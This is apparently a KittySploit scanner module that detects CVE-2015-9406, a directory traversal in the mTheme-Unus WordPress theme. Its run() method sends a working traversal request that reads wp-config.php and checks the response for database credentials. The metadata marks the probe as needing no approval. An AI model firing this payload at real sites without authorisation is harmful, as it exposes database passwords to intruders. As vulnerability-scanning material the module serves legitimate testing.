#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The mTheme-Unus theme for WordPress, prior to version 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'mTheme Unus < 2.3 - Directory Traversal Detection',
        'description': 'The mTheme-Unus theme for WordPress, prior to version 2.3, contained a directory traversal flaw that let attackers access arbitrary files. This was possible by exploiting the files parameter in css/css.php with .. sequences.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'wordpress', 'wp-theme', 'wp', 'wpscan', 'mtheme-unus', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d54b6b63-f280-412e-8c8f-17186727ac36/',
            'https://wpscan.com/vulnerability/bc036ee3-9648-49db-ae52-3a58fdeb82eb/',
            'https://wpvulndb.com/vulnerabilities/9890',
            'https://packetstormsecurity.com/files/133778/',
        ],
        'cve': 'CVE-2015-9406',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="mTheme Unus < 2.3 - Directory Traversal detected",
                path='/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
            )
            return True
        return False

